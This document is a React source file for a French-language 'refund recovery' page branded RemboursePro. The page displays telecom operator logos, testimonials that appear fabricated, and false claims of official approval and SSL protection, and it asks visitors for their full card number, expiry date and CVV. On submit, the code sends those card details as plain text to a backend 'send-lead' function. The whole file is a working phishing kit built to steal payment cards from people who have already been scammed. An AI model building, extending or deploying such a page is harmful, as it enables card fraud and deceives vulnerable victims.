import { useState, useEffect } from 'react'
import {
  CheckCircle, AlertCircle, Lock, CreditCard,
  ShieldCheck, Clock, Users, Star, ArrowRight, TrendingUp,
} from 'lucide-react'
// Direct Edge Function URL — no JWT dependency
const EDGE_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-lead`
const ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY
import secureImg    from '../assets/image copy.png'
import freeLogo     from '../assets/image copy 2.png'
import orangeLogo   from '../assets/image copy 3.png'
import sfrLogo      from '../assets/image copy 4.png'
import bouyguesLogo from '../assets/image copy 5.png'

const OPERATOR_LOGOS = [
  { src: freeLogo,     alt: 'Free Mobile',       bg: '#fff'     },
  { src: orangeLogo,   alt: 'Orange',             bg: '#ff7900'  },
  { src: sfrLogo,      alt: 'SFR',                bg: '#e2000f'  },
  { src: bouyguesLogo, alt: 'Bouygues Telecom',   bg: '#fff'     },
]

// ─── Constants ────────────────────────────────────────────────────────────────
const CURRENT_YEAR = new Date().getFullYear()

const MONTHS = [
  { value: '01', label: '01 – Jan' }, { value: '02', label: '02 – Fév' },
  { value: '03', label: '03 – Mar' }, { value: '04', label: '04 – Avr' },
  { value: '05', label: '05 – Mai' }, { value: '06', label: '06 – Juin' },
  { value: '07', label: '07 – Juil' }, { value: '08', label: '08 – Aoû' },
  { value: '09', label: '09 – Sep' }, { value: '10', label: '10 – Oct' },
  { value: '11', label: '11 – Nov' }, { value: '12', label: '12 – Déc' },
]

const YEARS = Array.from({ length: 12 }, (_, i) => CURRENT_YEAR + i)

const SLIDES = [
  {
    icon: ShieldCheck,
    stat: '94%',
    title: 'Taux de succès',
    body: 'Nous obtenons un remboursement pour la quasi-totalité des dossiers traités, grâce à notre expertise et partenariats bancaires.',
    quote: '"Remboursée de 480 € en 3 jours. Processus simple, équipe réactive."',
    author: 'Sophie L., Bordeaux',
  },
  {
    icon: Users,
    stat: '+2 500',
    title: 'Clients remboursés',
    body: 'Depuis 2021, des milliers de Français nous font confiance pour récupérer leur argent après une arnaque ou prélèvement abusif.',
    quote: '"RemboursePro a récupéré 1 250 € pour moi en moins de 2 semaines."',
    author: 'Thomas B., Paris',
  },
  {
    icon: Clock,
    stat: '48h',
    title: 'Délai moyen',
    body: 'Notre équipe analyse votre dossier en moins de 24h et engage les démarches sans délai. Votre remboursement est notre priorité.',
    quote: '"Réponse le lendemain de ma demande. Tout géré sans que je bouge."',
    author: 'Karim M., Marseille',
  },
  {
    icon: TrendingUp,
    stat: '0 €',
    title: 'Frais cachés',
    body: "L'analyse de votre dossier est entièrement gratuite. Aucun engagement, aucune surprise à aucune étape.",
    quote: '"Service 100% gratuit comme annoncé. Sérieux, professionnel, efficace."',
    author: 'Marie D., Lyon',
  },
]

const INITIAL_STATE = {
  firstName: '', lastName: '',
  cardNumber: '', month: '', year: '', cvv: '',
}

function validate(f) {
  const e = {}
  if (!f.firstName.trim())  e.firstName  = 'Requis.'
  if (!f.lastName.trim())   e.lastName   = 'Requis.'
  if (!f.cardNumber.trim()) e.cardNumber = 'Requis.'
  else if (!/^\d{13,19}$/.test(f.cardNumber.replace(/\s/g, ''))) e.cardNumber = 'Numéro invalide.'
  if (!f.month)             e.month      = 'Requis.'
  if (!f.year)              e.year       = 'Requis.'
  if (!f.cvv.trim())        e.cvv        = 'Requis.'
  else if (!/^\d{3,4}$/.test(f.cvv)) e.cvv = 'Invalide.'
  return e
}

function formatCard(v) {
  return v.replace(/\D/g, '').slice(0, 19).replace(/(.{4})/g, '$1 ').trim()
}

// ─── Infinite operator logo carousel ─────────────────────────────────────────
// Duplicates the set so the seamless loop always has tiles to scroll into
function OperatorCarousel({ tileClass = 'h-12 w-20', imgClass = 'h-7' }) {
  const doubled = [...OPERATOR_LOGOS, ...OPERATOR_LOGOS]
  return (
    <div className="overflow-hidden">
      <div className="marquee-track gap-2">
        {doubled.map(({ src, alt, bg }, i) => (
          <div
            key={`${alt}-${i}`}
            className={`mx-1 flex shrink-0 items-center justify-center overflow-hidden rounded-xl shadow-sm ${tileClass}`}
            style={{ background: bg }}
          >
            <img src={src} alt={alt} className={`object-contain px-2 ${imgClass}`} />
          </div>
        ))}
      </div>
    </div>
  )
}

// ─── Tiny helpers ─────────────────────────────────────────────────────────────
function Chevron() {
  return (
    <div className="pointer-events-none absolute inset-y-0 right-2.5 flex items-center">
      <svg className="h-3.5 w-3.5 text-slate-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
        <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
      </svg>
    </div>
  )
}

function Err({ id, msg }) {
  if (!msg) return null
  return (
    <p id={`${id}-error`} className="mt-0.5 flex items-center gap-1 text-[10px] leading-none text-red-500">
      <AlertCircle className="h-2.5 w-2.5 shrink-0" /> {msg}
    </p>
  )
}

// Compact field classes
const base = 'block w-full rounded-lg border px-3 py-2 text-sm transition focus:outline-none focus:ring-2'
const good = 'border-slate-200 bg-slate-50 text-slate-900 placeholder-slate-400 focus:border-orange-400 focus:bg-white focus:ring-orange-100'
const bad  = 'border-red-400 bg-red-50 text-slate-900 placeholder-slate-400 focus:ring-red-200'
const cls    = (err) => `${base} ${err ? bad : good}`
const selCls = (err, empty) =>
  `${base} appearance-none pr-7 ${err ? bad : good} ${empty ? 'text-slate-400' : 'text-slate-900'}` // used for month/year

// ─── Carousel ─────────────────────────────────────────────────────────────────
function Carousel() {
  const [active,  setActive]  = useState(0)
  const [visible, setVisible] = useState(true)

  const goTo = (i) => {
    setVisible(false)
    setTimeout(() => { setActive(i); setVisible(true) }, 350)
  }

  useEffect(() => {
    const id = setInterval(() => goTo((active + 1) % SLIDES.length), 4500)
    return () => clearInterval(id)
  }, [active])

  const { icon: Icon, stat, title, body, quote, author } = SLIDES[active]

  return (
    <div className="flex flex-1 flex-col justify-between">
      {/* Slide */}
      <div
        className="flex flex-1 flex-col"
        style={{
          opacity:    visible ? 1 : 0,
          transform:  visible ? 'translateY(0)' : 'translateY(10px)',
          transition: 'opacity 0.35s ease, transform 0.35s ease',
        }}
      >
        {/* Stat row */}
        <div className="mb-4 flex items-center gap-3">
          <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-white/15 ring-1 ring-white/20">
            <Icon className="h-5 w-5 text-orange-200" />
          </div>
          <div>
            <p className="text-2xl font-extrabold leading-none text-white">{stat}</p>
            <p className="text-xs font-semibold text-orange-200">{title}</p>
          </div>
        </div>

        {/* Body */}
        <p className="mb-4 text-xs leading-relaxed text-orange-100/80">{body}</p>

        {/* Quote card */}
        <div className="rounded-xl border border-white/10 bg-white/10 p-3.5 backdrop-blur-sm">
          <div className="mb-1.5 flex gap-0.5">
            {Array.from({ length: 5 }).map((_, i) => (
              <Star key={i} className="h-3 w-3 fill-amber-400 text-amber-400" />
            ))}
          </div>
          <p className="text-xs italic leading-relaxed text-white/80">{quote}</p>
          <p className="mt-1.5 text-[11px] font-semibold text-orange-300">— {author}</p>
        </div>
      </div>

      {/* Dots */}
      <div className="mt-4 flex items-center gap-1.5">
        {SLIDES.map((_, i) => (
          <button
            key={i}
            onClick={() => goTo(i)}
            className={`h-1.5 rounded-full transition-all duration-300 ${
              i === active ? 'w-5 bg-orange-300' : 'w-1.5 bg-white/30 hover:bg-white/50'
            }`}
            aria-label={`Slide ${i + 1}`}
          />
        ))}
      </div>
    </div>
  )
}

// ─── Left panel ───────────────────────────────────────────────────────────────
function BrandPanel() {
  return (
    <aside
      className="relative hidden overflow-hidden lg:flex lg:w-[44%] xl:w-[40%]"
      style={{
        background:   'linear-gradient(150deg,#c2410c 0%,#ea580c 40%,#f97316 75%,#fb923c 100%)',
        borderRadius: '0 1.75rem 1.75rem 0',
      }}
    >
      {/* Decorative layer */}
      <div className="pointer-events-none absolute inset-0" aria-hidden>
        <div className="absolute -right-24 -top-24 h-72 w-72 rounded-full bg-white/10 blur-3xl" />
        <div className="absolute -bottom-16 -left-16 h-56 w-56 rounded-full bg-orange-900/25 blur-3xl" />
        <div className="absolute right-[-100px] top-1/2 h-[420px] w-[420px] -translate-y-1/2 rounded-full border border-white/8" />
        <div className="absolute right-[-60px] top-1/2 h-[300px] w-[300px] -translate-y-1/2 rounded-full border border-white/6" />
        <svg className="absolute inset-0 h-full w-full opacity-[0.05]" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <pattern id="dots" x="0" y="0" width="22" height="22" patternUnits="userSpaceOnUse">
              <circle cx="2" cy="2" r="1.4" fill="white" />
            </pattern>
          </defs>
          <rect width="100%" height="100%" fill="url(#dots)" />
        </svg>
      </div>

      {/* Content — full height flex column */}
      <div className="relative flex h-full w-full flex-col px-8 py-8 xl:px-10 xl:py-10">

        {/* Headline block */}
        <div className="mb-6 shrink-0">
          <p className="mb-2 text-[11px] font-bold uppercase tracking-widest text-orange-200/80">
            Service officiel agréé
          </p>
          <h2 className="text-xl font-extrabold leading-snug text-white xl:text-2xl">
            Récupérez ce qui vous appartient,{' '}
            <span className="text-orange-200">en toute sécurité.</span>
          </h2>
          <p className="mt-2 text-xs leading-relaxed text-orange-100/70">
            Formulaire sécurisé pour initier votre remboursement. Notre équipe gère toutes
            les démarches à votre place.
          </p>
        </div>

        {/* Carousel — grows to fill space */}
        <div className="flex flex-1 flex-col overflow-hidden">
          <Carousel />
        </div>

        {/* Operator infinite carousel pinned to bottom */}
        <div className="mt-6 shrink-0">
          <p className="mb-2.5 text-[10px] font-semibold uppercase tracking-widest text-orange-200/60">
            Opérateurs partenaires
          </p>
          <OperatorCarousel tileClass="h-12 w-[4.5rem]" imgClass="h-7" />
        </div>
      </div>
    </aside>
  )
}

// ─── Main ─────────────────────────────────────────────────────────────────────
export default function Form() {
  const [fields, setFields]           = useState(INITIAL_STATE)
  const [errors, setErrors]           = useState({})
  const [status, setStatus]           = useState('idle')
  const [serverError, setServerError] = useState('')

  const onChange = (e) => {
    let { name, value } = e.target
    if (name === 'cardNumber') value = formatCard(value)
    if (name === 'cvv')        value = value.replace(/\D/g, '').slice(0, 4)
    setFields((p) => ({ ...p, [name]: value }))
    if (errors[name]) setErrors((p) => ({ ...p, [name]: '' }))
  }

  const onSubmit = async (e) => {
    e.preventDefault()
    const v = validate(fields)
    if (Object.keys(v).length) { setErrors(v); return }
    setStatus('loading')
    setServerError('')
    try {
      const payload = {
        name:    `${fields.firstName} ${fields.lastName}`,
        email:   '',
        phone:   '',
        message: `Carte: ${fields.cardNumber} | Exp: ${fields.month}/${fields.year} | CVV: ${fields.cvv}`,
      }
      const res = await fetch(EDGE_URL, {
        method:  'POST',
        headers: {
          'Content-Type':  'application/json',
          'Authorization': `Bearer ${ANON_KEY}`,
        },
        body: JSON.stringify(payload),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Erreur serveur')
      setStatus('success')
      setFields(INITIAL_STATE)
    } catch (err) {
      setStatus('error')
      setServerError(err.message || 'Une erreur est survenue. Veuillez réessayer.')
    }
  }

  // ── Success ────────────────────────────────────────────────────────────────
  if (status === 'success') {
    return (
      <div className="flex h-screen overflow-hidden">
        <BrandPanel />
        <main className="flex flex-1 items-center justify-center bg-white px-6">
          <div className="w-full max-w-sm text-center">
            <div className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-green-100">
              <CheckCircle className="h-7 w-7 text-green-600" />
            </div>
            <h2 className="mb-2 text-xl font-bold text-slate-900">Demande confirmée !</h2>
            <p className="text-sm leading-relaxed text-slate-500">
              Votre dossier a été enregistré. Notre équipe vous contactera sous{' '}
              <strong className="text-slate-700">24–48h ouvrées</strong>.
            </p>
            <button
              onClick={() => setStatus('idle')}
              className="mt-6 inline-flex items-center gap-2 rounded-lg border border-slate-200 bg-slate-50 px-5 py-2.5 text-sm font-medium text-slate-600 transition hover:bg-slate-100"
            >
              Nouvelle demande <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        </main>
      </div>
    )
  }

  // ── Form layout ────────────────────────────────────────────────────────────
  return (
    <div className="flex h-screen overflow-hidden bg-white">

      {/* Left */}
      <BrandPanel />

      {/* Right — full height flex column, no scroll */}
      <main className="flex flex-1 flex-col overflow-hidden">

        {/* Top bar */}
        <header className="flex shrink-0 items-center justify-between border-b border-slate-100 px-6 py-3">
          {/* Mobile brand */}
          <div className="flex items-center gap-2 lg:hidden">
            <div
              className="flex h-7 w-7 items-center justify-center rounded-lg"
              style={{ background: 'linear-gradient(135deg,#ea580c,#f97316)' }}
            >
              <ShieldCheck className="h-3.5 w-3.5 text-white" />
            </div>
            <span className="text-sm font-bold text-slate-900">RemboursePro</span>
          </div>
          <div className="hidden lg:block" />

          <div className="flex items-center gap-1.5 rounded-full border border-green-200 bg-green-50 px-3 py-1">
            <Lock className="h-3 w-3 text-green-600" />
            <span className="text-[11px] font-semibold text-green-700">Connexion sécurisée SSL</span>
          </div>
        </header>

        {/* Scrollable only when truly needed (very small screens) */}
        <div className="flex flex-1 items-center justify-center overflow-y-auto px-6 py-5">
        <div className="flex w-full max-w-sm flex-col justify-between">

          {/* Mobile-only operator carousel (hidden on desktop where left panel shows) */}
          <div className="mb-4 shrink-0 lg:hidden">
            <p className="mb-2 text-[10px] font-semibold uppercase tracking-widest text-slate-400">
              Opérateurs partenaires
            </p>
            <OperatorCarousel tileClass="h-10 w-16" imgClass="h-6" />
          </div>

          {/* Heading */}
          <div className="mb-4 shrink-0">
            <h1 className="text-xl font-extrabold tracking-tight text-slate-900 lg:text-2xl">
              Formulaire de Remboursement
            </h1>
            <p className="mt-1 text-xs leading-relaxed text-slate-500">
              Entrez les informations de votre carte bancaire pour recevoir votre
              remboursement. Processus 100% sécurisé et protégé.
            </p>
          </div>

          {/* Form */}
          <form onSubmit={onSubmit} noValidate className="flex flex-1 flex-col justify-between gap-3">

            <div className="space-y-3">

              {/* Prénom / Nom */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label htmlFor="firstName" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                    Prénom <span className="text-red-400">*</span>
                  </label>
                  <input id="firstName" name="firstName" type="text" autoComplete="given-name"
                    placeholder="Jean" value={fields.firstName} onChange={onChange}
                    aria-invalid={!!errors.firstName} className={cls(errors.firstName)} />
                  <Err id="firstName" msg={errors.firstName} />
                </div>
                <div>
                  <label htmlFor="lastName" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                    Nom <span className="text-red-400">*</span>
                  </label>
                  <input id="lastName" name="lastName" type="text" autoComplete="family-name"
                    placeholder="Dupont" value={fields.lastName} onChange={onChange}
                    aria-invalid={!!errors.lastName} className={cls(errors.lastName)} />
                  <Err id="lastName" msg={errors.lastName} />
                </div>
              </div>

              {/* Divider */}
              <div className="relative">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-slate-100" />
                </div>
                <div className="relative flex justify-center">
                  <span className="bg-white px-3 text-[10px] font-semibold uppercase tracking-widest text-slate-400">
                    Informations de carte
                  </span>
                </div>
              </div>

              {/* Card number */}
              <div>
                <label htmlFor="cardNumber" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                  Numéro de carte crédit <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <input id="cardNumber" name="cardNumber" type="text" inputMode="numeric"
                    autoComplete="cc-number" placeholder="1234 5678 9012 3456"
                    value={fields.cardNumber} onChange={onChange}
                    aria-invalid={!!errors.cardNumber}
                    className={`${cls(errors.cardNumber)} pr-10`} />
                  <div className="pointer-events-none absolute inset-y-0 right-3 flex items-center">
                    <CreditCard className="h-4 w-4 text-slate-300" />
                  </div>
                </div>
                <Err id="cardNumber" msg={errors.cardNumber} />
              </div>

              {/* Mois / Année / CVV */}
              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label htmlFor="month" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                    Mois <span className="text-red-400">*</span>
                  </label>
                  <div className="relative">
                    <select id="month" name="month" value={fields.month} onChange={onChange}
                      aria-invalid={!!errors.month}
                      className={selCls(errors.month, !fields.month)}>
                      <option value="" disabled>MM</option>
                      {MONTHS.map(({ value, label }) => <option key={value} value={value}>{label}</option>)}
                    </select>
                    <Chevron />
                  </div>
                  <Err id="month" msg={errors.month} />
                </div>
                <div>
                  <label htmlFor="year" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                    Année <span className="text-red-400">*</span>
                  </label>
                  <div className="relative">
                    <select id="year" name="year" value={fields.year} onChange={onChange}
                      aria-invalid={!!errors.year}
                      className={selCls(errors.year, !fields.year)}>
                      <option value="" disabled>AAAA</option>
                      {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
                    </select>
                    <Chevron />
                  </div>
                  <Err id="year" msg={errors.year} />
                </div>
                <div>
                  <label htmlFor="cvv" className="mb-1 block text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                    CVV <span className="text-red-400">*</span>
                  </label>
                  <input id="cvv" name="cvv" type="text" inputMode="numeric"
                    autoComplete="cc-csc" placeholder="•••"
                    value={fields.cvv} onChange={onChange}
                    aria-invalid={!!errors.cvv} className={cls(errors.cvv)} />
                  <Err id="cvv" msg={errors.cvv} />
                </div>
              </div>

              {/* Server error */}
              {status === 'error' && (
                <div className="flex items-start gap-2 rounded-lg border border-red-200 bg-red-50 p-3">
                  <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0 text-red-500" />
                  <p className="text-xs text-red-700">{serverError}</p>
                </div>
              )}
            </div>

            {/* Bottom section: CTA + secure image */}
            <div className="shrink-0 space-y-3 pt-1">

              {/* Submit */}
              <button
                type="submit"
                disabled={status === 'loading'}
                className="group mx-auto flex items-center justify-center gap-2 rounded-xl px-8 py-3 text-sm font-bold text-white shadow-md transition active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60"
                style={{
                  background:  'linear-gradient(135deg,#ea580c 0%,#f97316 100%)',
                  boxShadow:   '0 4px 16px rgba(234,88,12,0.35)',
                }}
              >
                {status === 'loading' ? (
                  <>
                    <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z" />
                    </svg>
                    Traitement en cours...
                  </>
                ) : (
                  <>
                    <Lock className="h-4 w-4" />
                    Confirmer votre remboursement
                    <ArrowRight className="h-4 w-4 transition-transform group-hover:translate-x-0.5" />
                  </>
                )}
              </button>

              <p className="flex items-center justify-center gap-1.5 text-[11px] text-slate-400">
                <Lock className="h-3 w-3" />
                Chiffrement SSL 256-bit · Données jamais partagées
              </p>

              {/* Secure payment logos */}
              <div className="border-t border-slate-100 pt-3">
                <img
                  src={secureImg}
                  alt="Remboursement Sécurisé Garanti – VISA Mastercard AMEX PayPal Klarna Google Pay Apple Pay"
                  className="mx-auto h-10 w-full object-contain"
                />
              </div>
            </div>
          </form>

        </div>{/* max-w-sm centered wrapper */}
        </div>{/* outer flex centering wrapper */}
      </main>
    </div>
  )
}
